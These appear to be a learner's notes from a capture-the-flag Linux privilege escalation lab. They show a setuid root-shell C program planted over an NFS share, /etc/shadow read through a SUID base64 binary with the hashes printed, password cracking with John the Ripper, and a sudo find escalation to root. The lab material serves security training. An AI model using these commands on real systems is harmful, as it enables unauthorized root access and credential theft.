+ali@kali:~# mount -o rw 10.10.183.223:/home/ubuntu/sharedfolder /tmp/nfsbackup/
+[sudo] password for kali: 
+kali@kali:~# ls /tmp/nfsbackup/
+
+
+11.3 build a simple exe and set SUID bit
+root@kali:/tmp/nfsbackup# cat nfs.c                        
+int main()
+{ setuid(0);
+  setgid(0);
+  system("/bin/bash");
+}
+
+oot@kali:/tmp/nfsbackup# gcc nfs.c -o nfs -w
+
+root@kali:/tmp/nfsbackup# chmod u+s nfs
+root@kali:/tmp/nfsbackup# ls -l        
+total 20
+-rwsr-xr-x 1 root root 16056 Feb 18  2023 nfs
+-rw-r--r-- 1 root root    62 Feb 18  2023 nfs.c
+
+###Build the exec on the Linux with the same or similar kernel/libc version
+
+11.4 go to the attacked server and run the exe and get the root shell:
+karen@ip-10-10-183-223:/home/ubuntu/sharedfolder$ ls -l
+total 20
+-rwsr-xr-x 1 root root 16056 Feb 18 11:05 nfs
+-rw-r--r-- 1 root root    62 Feb 18 11:05 nfs.c
+karen@ip-10-10-183-223:/home/ubuntu/sharedfolder$ id
+uid=1001(karen) gid=1001(karen) groups=1001(karen)
+
+
+karen@ip-10-10-183-223:/home/ubuntu/sharedfolder$ 
+karen@ip-10-10-183-223:/home/ubuntu/sharedfolder$ ldd nfs
+        linux-vdso.so.1 (0x00007ffeac1fd000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb84a2af000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fb84a6ab000)
+
+karen@ip-10-10-183-223:/home/ubuntu/sharedfolder$ ./nfs
+
+root@ip-10-10-183-223:/home/ubuntu/sharedfolder# id
+uid=0(root) gid=0(root) groups=0(root),1001(karen)
+
+root@ip-10-10-183-223:/home/ubuntu/sharedfolder# cat /home/matt/flag7.txt 
+THM-89384012
+
+task12
+12.1  check sudo, nfs and crontab didn't reveal any possibilioties
+
+12.2 Kernel version 
+Linux ip-10-10-60-153 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+we'll check it later
+
+12.3 find SUID files and see that base64 has it
+[leonard@ip-10-10-60-153 ~]$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/base64
+
+so we can easily read shadow file and try crack the passwords
+[leonard@ip-10-10-60-153 ~]$ base64 /etc/shadow | base64 -d
+root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
+leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
+missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
+
+
+use john ripper and found password:
+ress 'q' or Ctrl-C to abort, almost any other key for status
+Password1        (missy)     
+
+12.4 login as missy and password Password1
+ and check sudo:
+[missy@ip-10-10-60-153 ~]$ sudo -l
+Matching Defaults entries for missy on ip-10-10-60-153:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
+    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User missy may run the following commands on ip-10-10-60-153:
+    (ALL) NOPASSWD: /usr/bin/find
+
+12.5 check history
+[missy@ip-10-10-60-153 ~]$ history 
+    1  ls
+    2  cd missy/
+    3  ls
+    4  cd Do
+    5  cd Documents
+    6  ls
+    7  cat flag1.txt 
+    8  su root
+
+and find the flag1.txt
+[missy@ip-10-10-60-153 ~]$ cat  Documents/flag1.txt
+THM-42828719920544
+
+
+12.6 use sudo find to get root shell:
+find: unknown predicate `-e'
+[missy@ip-10-10-60-153 ~]$ sudo find /usr/bin -name bash -exec {} \;
+[root@ip-10-10-60-153 missy]# id
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+[root@ip-10-10-60-153 missy]#
+
+12.7  get the flag:
+[root@ip-10-10-60-153 missy]# cat /home/rootflag/flag2.txt 
+THM-168824782390238
+
+
+
+
